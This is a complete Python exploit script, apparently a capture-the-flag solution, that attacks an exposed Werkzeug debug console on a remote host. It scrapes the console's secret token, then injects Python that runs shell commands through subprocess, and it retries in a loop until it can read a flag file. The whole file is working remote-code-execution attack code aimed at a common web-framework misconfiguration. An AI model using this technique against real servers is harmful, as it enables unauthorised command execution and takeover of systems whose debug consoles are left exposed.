import re
import logging
from urllib import parse
import requests
import datetime
import time
logging.basicConfig(level=logging.INFO)


def shell_script_wrapper(code):
    return f'import subprocess;out = subprocess.Popen("{code}", shell=True, stdout=subprocess.PIPE, ' \
           'stderr=subprocess.STDOUT);stdout,stderr = out.communicate();print(stdout);'


def run_exploit(code, debugger='yes', frm=0):
    response = requests.get('http://jh2i.com:50018/console')
    secret = re.match('.*SECRET = "([a-zA-Z0-9]*)".*', response.text, re.DOTALL).group(1)
    logging.info(f'[SECRET]: {secret}')
    response = requests.get(
        f'http://jh2i.com:50018/console?__debugger__={debugger}&cmd={parse.quote(code)}&frm={frm}&s={secret}',
        headers=response.headers
    )
    print(f'[RESP][run]: {response.status_code} - {response.text}')
    return response


def await_run_exploit(code):
    n = 0
    result = None
    while True:
        try:
            result = run_exploit(code)
        except KeyboardInterrupt:
            break
        except Exception as e:
            logging.warning(f'Error: {e}')
            pass
        n += 1
        if result.ok:
            break
        print(f'[TIME]: {datetime.datetime.fromtimestamp(time.time())} - {n}')
    return result


if __name__ == '__main__':
    flag = await_run_exploit(shell_script_wrapper('cat flag.txt'))
    print(flag)
